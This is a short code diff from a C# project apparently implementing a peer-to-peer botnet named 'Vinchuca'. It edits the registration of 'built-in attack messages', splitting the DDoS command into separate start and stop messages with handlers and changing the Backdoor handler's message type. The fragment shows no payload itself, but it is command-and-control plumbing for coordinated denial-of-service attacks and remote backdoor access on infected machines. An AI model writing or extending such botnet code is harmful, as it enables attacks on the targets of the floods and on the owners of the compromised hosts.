@@ -117,15 +117,21 @@ namespace Vinchuca
 
             // built-in attack messages
             _messagesManager.Register(
-                MessageCode.DDos,
+                MessageCode.DDoSStart,
                 MessageType.Request,
                 typeof(DosAttackMessage),
                 new DosAttackHandler(_peerList, _messagesManager),
                 (int)Difficulty.NoWork);
             _messagesManager.Register(
+                MessageCode.DDoSStop,
+                MessageType.Request,
+                typeof(DosStopAttackMessage),
+                new DosStopAttackHandler(_peerList, _messagesManager), 
+                (int)Difficulty.NoWork);
+            _messagesManager.Register(
                 MessageCode.Backdoor,
-                MessageType.Reply,
-                typeof(BackdoorHandler),
+                MessageType.Request,
+                typeof(BackdoorMessage),
                 new BackdoorHandler(_messagesManager),
                 (int)Difficulty.NoWork);
             _messagesManager.Register(
